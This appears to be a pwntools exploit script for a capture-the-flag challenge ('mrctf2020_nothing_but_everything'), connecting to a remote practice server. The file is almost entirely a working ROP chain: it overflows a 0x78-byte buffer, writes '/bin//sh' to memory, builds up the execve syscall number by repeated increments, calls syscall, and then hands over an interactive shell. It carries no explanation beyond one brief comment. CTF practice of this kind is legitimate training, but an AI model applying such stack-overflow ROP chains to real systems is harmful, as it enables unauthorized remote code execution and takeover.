#coding=utf-8
from pwn import *
from struct import pack
context.log_level = "debug"

# io = process("./mrctf2020_nothing_but_everything")
io = remote("node4.buuoj.cn",29553)

# 经典扬表加静链 ，直接 ropchain 加半盲猜拿下

# Padding goes here
p = 'a'*0x78

p += pack('<Q', 0x00000000004100d3) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e0) # @ .data
p += pack('<Q', 0x00000000004494ac) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x000000000047f261) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004100d3) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000444840) # xor rax, rax ; ret
p += pack('<Q', 0x000000000047f261) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000400686) # pop rdi ; ret
p += pack('<Q', 0x00000000006b90e0) # @ .data
p += pack('<Q', 0x00000000004100d3) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000449505) # pop rdx ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000444840) # xor rax, rax ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000040123c) # syscall

io.sendline("aa")
io.sendline(p)


io.interactive()